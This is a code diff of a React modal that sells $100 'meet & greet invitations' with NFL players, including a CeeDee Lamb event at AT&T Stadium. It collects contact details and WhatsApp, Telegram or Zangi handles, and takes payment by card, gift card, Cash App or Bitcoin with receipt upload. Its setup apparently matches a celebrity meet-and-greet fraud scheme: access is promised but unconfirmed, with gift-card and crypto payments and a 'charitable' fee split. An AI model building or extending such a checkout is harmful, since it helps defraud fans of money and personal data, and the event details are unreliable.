-                      placeholder="e.g. John Doe"
-                      value={fullName}
-                      onChange={(e) => setFullName(e.target.value)}
-                      className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
-                    />
+                        {INQUIRY_OBJECTIVES.map(obj => (
+                          <option key={obj} value={obj} className="bg-zinc-900 text-white text-xs">
+                            {obj}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
                   </div>
 
-                  {/* Email */}
-                  <div className="space-y-1.5">
-                    <label className="text-[10px] font-black uppercase text-zinc-400 flex items-center gap-1.5">
-                      <Mail className="w-3.5 h-3.5 text-zinc-500" />
-                      Email Address <span className="text-rose-400">*</span>
-                    </label>
-                    <input
-                      type="email"
-                      required
-                      placeholder="e.g. john@example.com"
-                      value={email}
-                      onChange={(e) => setEmail(e.target.value)}
-                      className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
-                    />
-                  </div>
-                </div>
+                  {/* Section 2: Customer Identity & Preferred Messaging Platform */}
+                  <div className="space-y-4 p-5 bg-zinc-900/40 rounded-3xl border border-white/5">
+                    <div className="flex items-center justify-between">
+                      <h4 className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
+                        <span className="w-2 h-2 rounded-full bg-emerald-500" />
+                        2. Your Contact & Messaging Platform
+                      </h4>
+                      <span className="text-[9px] font-mono text-emerald-400">WHERE WE SEND PLAYER DETAILS</span>
+                    </div>
 
-                {/* Messaging Platform Choice */}
-                <div className="space-y-2 pt-2">
-                  <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider block">
-                    Choose Your Messaging Platform for Direct Liaison <span className="text-rose-400">*</span>
-                  </label>
-                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
-                    {MESSAGING_PLATFORMS.map(p => {
-                      const isSelected = messagingPlatform === p.id;
-                      return (
+                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                      {/* Full Name */}
+                      <div className="space-y-1.5">
+                        <label className="text-[10px] font-black uppercase text-zinc-400 flex items-center gap-1.5">
+                          <User className="w-3.5 h-3.5 text-zinc-500" />
+                          Full Name <span className="text-rose-400">*</span>
+                        </label>
+                        <input
+                          type="text"
+                          required
+                          placeholder="e.g. John Doe"
+                          value={fullName}
+                          onChange={(e) => setFullName(e.target.value)}
+                          className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
+                        />
+                      </div>
+
+                      {/* Email */}
+                      <div className="space-y-1.5">
+                        <label className="text-[10px] font-black uppercase text-zinc-400 flex items-center gap-1.5">
+                          <Mail className="w-3.5 h-3.5 text-zinc-500" />
+                          Email Address <span className="text-rose-400">*</span>
+                        </label>
+                        <input
+                          type="email"
+                          required
+                          placeholder="e.g. john@example.com"
+                          value={email}
+                          onChange={(e) => setEmail(e.target.value)}
+                          className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
+                        />
+                      </div>
+                    </div>
+
+                    {/* Messaging Platform Choice */}
+                    <div className="space-y-2 pt-2">
+                      <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider block">
+                        Choose Your Messaging Platform for Direct Liaison <span className="text-rose-400">*</span>
+                      </label>
+                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
+                        {MESSAGING_PLATFORMS.map(p => {
+                          const isSelected = messagingPlatform === p.id;
+                          return (
+                            <button
+                              key={p.id}
+                              type="button"
+                              onClick={() => setMessagingPlatform(p.id)}
+                              className={cn(
+                                "p-3 rounded-2xl border text-left transition-all cursor-pointer flex flex-col justify-between",
+                                isSelected
+                                  ? `${p.color} ring-1 ring-white/20 shadow-lg`
+                                  : "bg-zinc-900/60 border-white/5 hover:border-white/15 text-zinc-400"
+                              )}
+                            >
+                              <div className="flex items-center justify-between mb-1">
+                                <span className="text-base">{p.icon}</span>
+                                {isSelected && <Check className="w-3.5 h-3.5 text-white" />}
+                              </div>
+                              <span className="text-xs font-black uppercase tracking-wide text-white block">
+                                {p.name}
+                              </span>
+                              <span className="text-[8px] font-mono opacity-80 mt-0.5 truncate block">
+                                {p.badge}
+                              </span>
+                            </button>
+                          );
+                        })}
+                      </div>
+                    </div>
+
+                    {/* Messaging Platform Details / Handle */}
+                    <div className="space-y-1.5 pt-2">
+                      <label className="text-[10px] font-black uppercase text-zinc-300 flex items-center justify-between">
+                        <span className="flex items-center gap-1.5">
+                          <MessageSquare className="w-3.5 h-3.5 text-blue-400" />
+                          {MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name} Details / Username / Phone Number <span className="text-rose-400">*</span>
+                        </span>
+                        <span className="text-[9px] font-mono text-zinc-500">Concierge Delivery</span>
+                      </label>
+                      <input
+                        type="text"
+                        required
+                        placeholder={
+                          messagingPlatform === "whatsapp"
+                            ? "e.g. +1 (203) 815-5944 (include country code)"
+                            : messagingPlatform === "zangi"
+                            ? "e.g. Zangi Number or Account Number (e.g. 10-1234-5678)"
+                            : "e.g. @your_telegram_username or +1 phone"
+                        }
+                        value={messagingDetails}
+                        onChange={(e) => setMessagingDetails(e.target.value)}
+                        className="w-full bg-zinc-900 border border-blue-500/30 rounded-2xl px-4 py-3 text-xs text-white font-mono placeholder-zinc-600 focus:outline-none focus:ring-1 focus:ring-blue-500"
+                      />
+                      <p className="text-[9px] text-zinc-500">
+                        Our player liaison team sends verified availability, quotes, and confirmed player details directly to this account.
+                      </p>
+                    </div>
+
+                    {/* Special Notes / Message */}
+                    <div className="space-y-1.5">
+                      <label className="text-[10px] font-black uppercase text-zinc-400 block">
+                        Special Requests or Questions for Player (Optional)
+                      </label>
+                      <textarea
+                        rows={2}
+                        placeholder="e.g. Inquiring for an upcoming birthday in November, need 1-on-1 photo op and jersey signature..."
+                        value={specialNotes}
+                        onChange={(e) => setSpecialNotes(e.target.value)}
+                        className="w-full bg-zinc-900 border border-white/10 rounded-2xl p-3 text-xs text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-blue-500"
+                      />
+                    </div>
+                  </div>
+
+                  {/* Transparent $100 Invitation Fee & Charitable Allocation Disclosure */}
+                  <div className="p-5 bg-gradient-to-br from-[#050816] via-[#08112B] to-[#03050C] rounded-3xl border border-[#013369]/60 space-y-4">
+                    <div className="space-y-2">
+                      <span className="text-[10px] font-black uppercase text-sky-400 tracking-wider inline-flex items-center gap-1.5">
+                        <HeartHandshake className="w-3.5 h-3.5 text-sky-400" />
+                        Invitation Process &amp; Transparent $100 Breakdown
+                      </span>
+                      <h4 className="text-sm font-black uppercase tracking-tight text-white">
+                        $75.00 Concierge Coordination Fee + $25.00 Charitable Allocation
+                      </h4>
+                      <p className="text-xs text-zinc-300 font-medium leading-relaxed">
+                        Every <strong className="text-white">$100</strong> invitation request includes a <strong className="text-white">$75.00</strong> coordination and processing fee plus a <strong className="text-emerald-400">$25.00</strong> contribution earmarked toward{" "}
+                        <strong className="text-white">{CHARITY_ALLOCATION.beneficiary}</strong> youth education and mentorship initiatives. Invitations remain subject to player availability, confirmed events, and authorized arrangements, and our team will message you for the next available invite.
+                      </p>
+                    </div>
+
+                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-[11px]">
+                      <div className="p-3 rounded-2xl bg-[#03050C]/90 border border-white/10">
+                        <span className="text-[9px] font-mono font-black uppercase text-sky-400 block">Step 1 · Select Payment</span>
+                        <p className="text-zinc-300 mt-0.5 leading-snug">Pay securely via Stripe (Debit / Credit Card), buy &amp; redeem a Gift Card without signing in, or use Cash App or Bitcoin (5% off).</p>
+                      </div>
+                      <div className="p-3 rounded-2xl bg-[#03050C]/90 border border-white/10">
+                        <span className="text-[9px] font-mono font-black uppercase text-sky-400 block">Step 2 · Verify Transaction</span>
+                        <p className="text-zinc-300 mt-0.5 leading-snug">Card payments confirm automatically; manual transfers require genuine receipt upload before verification.</p>
+                      </div>
+                      <div className="p-3 rounded-2xl bg-[#03050C]/90 border border-white/10">
+                        <span className="text-[9px] font-mono font-black uppercase text-emerald-400 block">Step 3 · Next Invite Update</span>
+                        <p className="text-zinc-300 mt-0.5 leading-snug">Once confirmed, our concierge messages you via {MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name || "your chosen app"} &amp; email when an invite window opens.</p>
+                      </div>
+                    </div>
+
+                    <div className="pt-1 flex flex-wrap items-center justify-between gap-3">
+                      {onOpenLegalModal && (
                         <button
-                          key={p.id}
                           type="button"
-                          onClick={() => setMessagingPlatform(p.id)}
-                          className={cn(
-                            "p-3 rounded-2xl border text-left transition-all cursor-pointer flex flex-col justify-between",
-                            isSelected
-                              ? `${p.color} ring-1 ring-white/20 shadow-lg`
-                              : "bg-zinc-900/60 border-white/5 hover:border-white/15 text-zinc-400"
-                          )}
+                          onClick={() => onOpenLegalModal("charity")}
+                          className="text-xs font-semibold text-sky-400 hover:text-white hover:underline cursor-pointer"
                         >
-                          <div className="flex items-center justify-between mb-1">
-                            <span className="text-base">{p.icon}</span>
-                            {isSelected && <Check className="w-3.5 h-3.5 text-white" />}
-                          </div>
-                          <span className="text-xs font-black uppercase tracking-wide text-white block">
-                            {p.name}
-                          </span>
-                          <span className="text-[8px] font-mono opacity-80 mt-0.5 truncate block">
-                            {p.badge}
-                          </span>
+                          View Charitable Initiative &amp; Refund Policy Disclosures →
                         </button>
-                      );
-                    })}
+                      )}
+                      <button
+                        type="submit"
+                        className="w-full sm:w-auto px-8 py-4 bg-[#D50A0A] hover:bg-[#B91C1C] text-white border border-white/15 font-extrabold uppercase text-xs tracking-wider rounded-2xl transition-all shadow-lg shadow-red-900/30 flex items-center justify-center gap-2.5 cursor-pointer"
+                      >
+                        <span>GET YOUR INVITATION – $100</span>
+                        <ArrowRight className="w-4 h-4" />
+                      </button>
+                    </div>
                   </div>
-                </div>
-
-                {/* Messaging Platform Details / Handle */}
-                <div className="space-y-1.5 pt-2">
-                  <label className="text-[10px] font-black uppercase text-zinc-300 flex items-center justify-between">
-                    <span className="flex items-center gap-1.5">
-                      <MessageSquare className="w-3.5 h-3.5 text-blue-400" />
-                      {MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name} Details / Username / Phone Number <span className="text-rose-400">*</span>
-                    </span>
-                    <span className="text-[9px] font-mono text-zinc-500">Concierge Delivery</span>
-                  </label>
-                  <input
-                    type="text"
-                    required
-                    placeholder={
-                      messagingPlatform === "whatsapp"
-                        ? "e.g. +1 (203) 815-5944 (include country code)"
-                        : messagingPlatform === "zangi"
-                        ? "e.g. Zangi Number or Account Number (e.g. 10-1234-5678)"
-                        : "e.g. @your_telegram_username or +1 phone"
-                    }
-                    value={messagingDetails}
-                    onChange={(e) => setMessagingDetails(e.target.value)}
-                    className="w-full bg-zinc-900 border border-blue-500/30 rounded-2xl px-4 py-3 text-xs text-white font-mono placeholder-zinc-600 focus:outline-none focus:ring-1 focus:ring-blue-500"
-                  />
-                  <p className="text-[9px] text-zinc-500">
-                    Our player liaison team sends verified availability, quotes, and confirmed player details directly to this account.
-                  </p>
-                </div>
-
-                {/* Special Notes / Message */}
-                <div className="space-y-1.5">
-                  <label className="text-[10px] font-black uppercase text-zinc-400 block">
-                    Special Requests or Questions for Player (Optional)
-                  </label>
-                  <textarea
-                    rows={2}
-                    placeholder="e.g. Inquiring for an upcoming birthday in November, need 1-on-1 photo op and jersey signature..."
-                    value={specialNotes}
-                    onChange={(e) => setSpecialNotes(e.target.value)}
-                    className="w-full bg-zinc-900 border border-white/10 rounded-2xl p-3 text-xs text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-blue-500"
-                  />
-                </div>
-              </div>
-
-              {/* Transparent $100 Invitation Fee & Charitable Allocation Disclosure */}
-              <div className="p-5 bg-gradient-to-br from-[#050816] via-[#08112B] to-[#03050C] rounded-3xl border border-[#013369]/60 space-y-4">
-                <div className="space-y-2">
-                  <span className="text-[10px] font-black uppercase text-sky-400 tracking-wider inline-flex items-center gap-1.5">
-                    <HeartHandshake className="w-3.5 h-3.5 text-sky-400" />
-                    Invitation Process &amp; Transparent $100 Breakdown
-                  </span>
-                  <h4 className="text-sm font-black uppercase tracking-tight text-white">
-                    $75.00 Concierge Coordination Fee + $25.00 Charitable Allocation
-                  </h4>
-                  <p className="text-xs text-zinc-300 font-medium leading-relaxed">
-                    Every <strong className="text-white">$100</strong> invitation request includes a <strong className="text-white">$75.00</strong> coordination and processing fee plus a <strong className="text-emerald-400">$25.00</strong> contribution earmarked toward{" "}
-                    <strong className="text-white">{CHARITY_ALLOCATION.beneficiary}</strong> youth education and mentorship initiatives. Invitations remain subject to player availability, confirmed events, and authorized arrangements, and our team will message you for the next available invite.
-                  </p>
-                </div>
-
-                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-[11px]">
-                  <div className="p-3 rounded-2xl bg-[#03050C]/90 border border-white/10">
-                    <span className="text-[9px] font-mono font-black uppercase text-sky-400 block">Step 1 · Select Payment</span>
-                    <p className="text-zinc-300 mt-0.5 leading-snug">Pay securely via Stripe (Debit / Credit Card), buy &amp; redeem a Gift Card without signing in, or use Cash App or Bitcoin (5% off).</p>
-                  </div>
-                  <div className="p-3 rounded-2xl bg-[#03050C]/90 border border-white/10">
-                    <span className="text-[9px] font-mono font-black uppercase text-sky-400 block">Step 2 · Verify Transaction</span>
-                    <p className="text-zinc-300 mt-0.5 leading-snug">Card payments confirm automatically; manual transfers require genuine receipt upload before verification.</p>
-                  </div>
-                  <div className="p-3 rounded-2xl bg-[#03050C]/90 border border-white/10">
-                    <span className="text-[9px] font-mono font-black uppercase text-emerald-400 block">Step 3 · Next Invite Update</span>
-                    <p className="text-zinc-300 mt-0.5 leading-snug">Once confirmed, our concierge messages you via {MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name || "your chosen app"} &amp; email when an invite window opens.</p>
-                  </div>
-                </div>
-
-                <div className="pt-1 flex flex-wrap items-center justify-between gap-3">
-                  {onOpenLegalModal && (
-                    <button
-                      type="button"
-                      onClick={() => onOpenLegalModal("charity")}
-                      className="text-xs font-semibold text-sky-400 hover:text-white hover:underline cursor-pointer"
-                    >
-                      View Charitable Initiative &amp; Refund Policy Disclosures →
-                    </button>
-                  )}
-                  <button
-                    type="submit"
-                    className="w-full sm:w-auto px-8 py-4 bg-[#D50A0A] hover:bg-[#B91C1C] text-white border border-white/15 font-extrabold uppercase text-xs tracking-wider rounded-2xl transition-all shadow-lg shadow-red-900/30 flex items-center justify-center gap-2.5 cursor-pointer"
-                  >
-                    <span>GET YOUR INVITATION – $100</span>
-                    <ArrowRight className="w-4 h-4" />
-                  </button>
-                </div>
-              </div>
+                </>
+              )}
             </form>
           )}
 
@@ -1287,28 +1447,36 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                 </div>
               )}
               {/* Order recap card */}
-              <div className="p-4 bg-zinc-900/60 rounded-2xl border border-white/10 flex items-center justify-between">
-                <div className="flex items-center gap-3">
+              <div className="p-4 bg-zinc-900/60 rounded-2xl border border-white/10 flex items-center justify-between gap-3">
+                <div className="flex items-center gap-3 min-w-0">
                   <img 
                     src={getLogoUrl(selectedTeam.id)} 
                     alt={selectedTeam.name} 
                     className="w-10 h-10 object-contain shrink-0" 
                   />
-                  <div>
+                  <div className="min-w-0">
                     <span className="text-[8px] font-black uppercase text-blue-400 tracking-widest block">
-                      PLAYER INQUIRY CLEARANCE
+                      {isPublicCeeDeeMeetGreet
+                        ? "PUBLIC MEET & GREET · DECEMBER 10TH"
+                        : "PLAYER INQUIRY CLEARANCE"}
                     </span>
-                    <h5 className="text-sm font-black uppercase text-white">
-                      {favoritePlayer} · {selectedTeam.city} {selectedTeam.name}
+                    <h5 className="text-sm font-black uppercase text-white truncate">
+                      {isPublicCeeDeeMeetGreet
+                        ? "CeeDee Lamb · Public Meet & Greet"
+                        : `${favoritePlayer} · ${selectedTeam.city} ${selectedTeam.name}`}
                     </h5>
-                    <p className="text-[9px] font-mono text-zinc-400">
-                      Liaison Channel: {MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name} ({messagingDetails})
+                    <p className="text-[9px] font-mono text-zinc-400 truncate">
+                      {isPublicCeeDeeMeetGreet
+                        ? `AT&T Stadium, Arlington, TX · ${fullName} (${email})`
+                        : `Liaison Channel: ${MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name} (${messagingDetails})`}
                     </p>
                   </div>
                 </div>
 
-                <div className="text-right">
-                  <span className="text-[9px] font-mono text-zinc-400 uppercase block">Invitation Fee</span>
+                <div className="text-right shrink-0">
+                  <span className="text-[9px] font-mono text-zinc-400 uppercase block">
+                    {isPublicCeeDeeMeetGreet ? "Ticket Price" : "Invitation Fee"}
+                  </span>
                   <span className="text-xl font-mono font-black text-white">${finalPrice}.00 USD</span>
                 </div>
               </div>
@@ -1399,14 +1567,22 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
               ) : paymentMethod === "card" ? (
                 <StripeCardCheckoutPanel
                   amountUsd={100}
-                  itemName={`Meet & Greet Invitation — ${favoritePlayer || "Selected Player"}`}
-                  itemDescription={`Invitation request for ${favoritePlayer || "Selected Player"} (${selectedTeam.city} ${selectedTeam.name}). Includes $75.00 coordination fee + $25.00 earmarked support for Boys & Girls Clubs of America.`}
+                  itemName={
+                    isPublicCeeDeeMeetGreet
+                      ? "CeeDee Lamb Public Meet & Greet · December 10th"
+                      : `Meet & Greet Invitation — ${favoritePlayer || "Selected Player"}`
+                  }
+                  itemDescription={
+                    isPublicCeeDeeMeetGreet
+                      ? "CeeDee Lamb Public Meet & Greet · December 10th · AT&T Stadium, Arlington, Texas."
+                      : `Invitation request for ${favoritePlayer || "Selected Player"} (${selectedTeam.city} ${selectedTeam.name}). Includes $75.00 coordination fee + $25.00 earmarked support for Boys & Girls Clubs of America.`
+                  }
                   sessionId={checkoutSessionId}
                   customerName={fullName}
                   customerEmail={email}
-                  customerPhone={phone || messagingDetails}
-                  playerName={favoritePlayer}
-                  isCharityEligible={true}
+                  customerPhone={phone || (isPublicCeeDeeMeetGreet ? email : messagingDetails)}
+                  playerName={favoritePlayer || "CeeDee Lamb"}
+                  isCharityEligible={!isPublicCeeDeeMeetGreet}
                   onReturnToOptions={() => setPaymentMethod("giftcard")}
                   onSwitchToBitcoin={() => setPaymentMethod("crypto")}
                   onSwitchToGiftCard={() => setPaymentMethod("giftcard")}
@@ -1423,31 +1599,42 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                     const passCode = `PASS-INQ-${Date.now().toString(36).toUpperCase()}`;
                     const nowIso = new Date().toISOString();
                     const platformObj = MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform);
-                    const platformName = platformObj?.name || messagingPlatform.toUpperCase();
+                    const platformName = isPublicCeeDeeMeetGreet ? "Gmail" : (platformObj?.name || messagingPlatform.toUpperCase());
+                    const contactHandle = isPublicCeeDeeMeetGreet ? email.trim() : messagingDetails.trim();
+                    const playerLabel = favoritePlayer.trim() || "CeeDee Lamb";
 
                     const verifiedData: any = {
                       id: orderId,
                       orderId,
                       bookingId: orderId,
-                      shortId: `INQ-${selectedTeam.id}-${favoritePlayer.replace(/\s+/g, "").slice(0, 6).toUpperCase()}`,
+                      shortId: `INQ-${selectedTeam.id}-${playerLabel.replace(/\s+/g, "").slice(0, 6).toUpperCase()}`,
                       ticketCode: passCode,
                       qrCode: passCode,
                       passCode,
-                      experienceId: "exp-player-inquiry-session",
-                      experienceTitle: `MEET & GREET INVITATION: ${favoritePlayer.toUpperCase()} (${selectedTeam.city} ${selectedTeam.name})`,
-                      gameName: `Meet & Greet Invitation: ${favoritePlayer}`,
-                      eventTitle: `Meet & Greet Invitation: ${favoritePlayer}`,
-                      itemName: `Meet & Greet Invitation (${favoritePlayer}) - Stripe Verified`,
-                      experienceType: "player_inquiry",
-                      player: favoritePlayer.trim() || "Selected Player",
-                      favoritePlayer: favoritePlayer.trim() || "Selected Player",
+                      experienceId: isPublicCeeDeeMeetGreet ? "exp-ceedee-public-dec10" : "exp-player-inquiry-session",
+                      experienceTitle: isPublicCeeDeeMeetGreet
+                        ? "CEEDÉE LAMB PUBLIC MEET & GREET — DECEMBER 10TH"
+                        : `MEET & GREET INVITATION: ${playerLabel.toUpperCase()} (${selectedTeam.city} ${selectedTeam.name})`,
+                      gameName: isPublicCeeDeeMeetGreet
+                        ? "CeeDee Lamb Public Meet & Greet · December 10th"
+                        : `Meet & Greet Invitation: ${playerLabel}`,
+                      eventTitle: isPublicCeeDeeMeetGreet
+                        ? "CeeDee Lamb Public Meet & Greet · AT&T Stadium, Arlington, TX"
+                        : `Meet & Greet Invitation: ${playerLabel}`,
+                      itemName: isPublicCeeDeeMeetGreet
+                        ? "CeeDee Lamb Public Meet & Greet (December 10th · AT&T Stadium) - Stripe Verified"
+                        : `Meet & Greet Invitation (${playerLabel}) - Stripe Verified`,
+                      experienceType: isPublicCeeDeeMeetGreet ? "meet_greet" : "player_inquiry",
+                      player: playerLabel,
+                      favoritePlayer: playerLabel,
                       teamId: selectedTeam.id,
                       teamName: `${selectedTeam.city} ${selectedTeam.name}`,
-                      stadium: "Hospitality Concierge Scheduling Queue",
-                      city: selectedTeam.city,
-                      date: "Subject to player availability & confirmed events",
+                      stadium: effectiveVenue,
+                      venue: effectiveVenue,
+                      city: isPublicCeeDeeMeetGreet ? "Arlington, TX" : selectedTeam.city,
+                      date: isPublicCeeDeeMeetGreet ? "December 10th" : "Subject to player availability & confirmed events",
                       tier: "standard",
-                      tierName: "MEET & GREET INVITATION REQUEST",
+                      tierName: isPublicCeeDeeMeetGreet ? "PUBLIC MEET & GREET ADMISSION" : "MEET & GREET INVITATION REQUEST",
                       quantity: 1,
                       guestsCount: 1,
                       unitPrice: receipt.amountTotal,
@@ -1461,12 +1648,12 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                       senderName: receipt.customerName || fullName.trim() || "VIP Guest",
                       buyerEmail: receipt.customerEmail || email.trim(),
                       userEmail: receipt.customerEmail || email.trim(),
-                      buyerPhone: phone.trim() || messagingDetails.trim(),
+                      buyerPhone: phone.trim() || contactHandle,
                       messagingPlatform: platformName,
-                      messagingDetails: messagingDetails.trim(),
+                      messagingDetails: contactHandle,
                       status: "paid_verified",
-                      orderStatus: "STRIPE PAYMENT VERIFIED · INVITATION QUEUED",
-                      approvalStatus: "STRIPE CHECKOUT VERIFIED · NEXT INVITE SCHEDULED",
+                      orderStatus: "STRIPE PAYMENT VERIFIED · RESERVATION CONFIRMED",
+                      approvalStatus: "STRIPE CHECKOUT VERIFIED · PASS READY",
                       isApproved: false,
                       paymentMethod: "card",
                       paymentSessionId: receipt.sessionId,
@@ -1484,16 +1671,17 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                         id: orderId,
                         orderId,
                         sessionId: receipt.sessionId,
-                        type: "player_inquiry",
+                        type: isPublicCeeDeeMeetGreet ? "ceedee_public_meet_greet" : "player_inquiry",
                         category: "player_inquiry",
                         customerName: verifiedData.buyerName,
                         customerEmail: verifiedData.buyerEmail,
                         customerPhone: verifiedData.buyerPhone,
                         teamId: selectedTeam.id,
                         teamName: `${selectedTeam.city} ${selectedTeam.name}`,
+                        venue: effectiveVenue,
                         favoritePlayer: verifiedData.player,
                         messagingPlatform: platformName,
-                        messagingDetails: messagingDetails.trim(),
+                        messagingDetails: contactHandle,
                         feePaid: receipt.amountTotal,
                         paymentMethod: "card",
                         paymentRef: receipt.sessionId,
@@ -1518,8 +1706,12 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                       orderReference={checkoutSessionId}
                       customerName={fullName}
                       customerEmail={email}
-                      customerPhone={phone || messagingDetails}
-                      itemTitle={`Player Inquiry: ${favoritePlayer} (${selectedTeam.id})`}
+                      customerPhone={phone || (isPublicCeeDeeMeetGreet ? email : messagingDetails)}
+                      itemTitle={
+                        isPublicCeeDeeMeetGreet
+                          ? "CeeDee Lamb Public Meet & Greet · Dec 10 (AT&T Stadium, Arlington, TX)"
+                          : `Player Inquiry: ${favoritePlayer} (${selectedTeam.id})`
+                      }
                       itemType="experience"
                       onSwitchToGiftCard={() => setPaymentMethod("giftcard")}
                       onSwitchToMethod={(m) => setPaymentMethod(m as any)}
@@ -1554,7 +1746,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                           setReceiptImageUrl(urls[0] || "");
                         }}
                         label="Upload Proof of Payment Receipt (Mandatory)"
-                        subtitle="Upload a clear screenshot or receipt photo confirming your charitable contribution. Required before submitting."
+                        subtitle="Upload a clear screenshot or receipt photo confirming your contribution. Required before submitting."
                       />
                     </div>
                   </div>
@@ -1571,6 +1763,17 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                     balance={giftCardDetails.amount}
                     onBalanceChange={(amount) => setGiftCardDetails(prev => ({ ...prev, amount }))}
                     discountBadge="Guest Checkout Enabled"
+                    sessionId={checkoutSessionId}
+                    customerName={fullName}
+                    customerEmail={email}
+                    customerPhone={phone || (isPublicCeeDeeMeetGreet ? email : messagingDetails)}
+                    itemTitle={
+                      isPublicCeeDeeMeetGreet
+                        ? "CeeDee Lamb Public Meet & Greet · December 10th"
+                        : `${favoritePlayer || "NFL Player"} Meet & Greet Inquiry`
+                    }
+                    itemType="experience"
+                    venue={isPublicCeeDeeMeetGreet ? "AT&T Stadium · Arlington, Texas" : undefined}
                   />
 
                   <div className="p-4 bg-zinc-900/80 rounded-3xl border border-white/10">
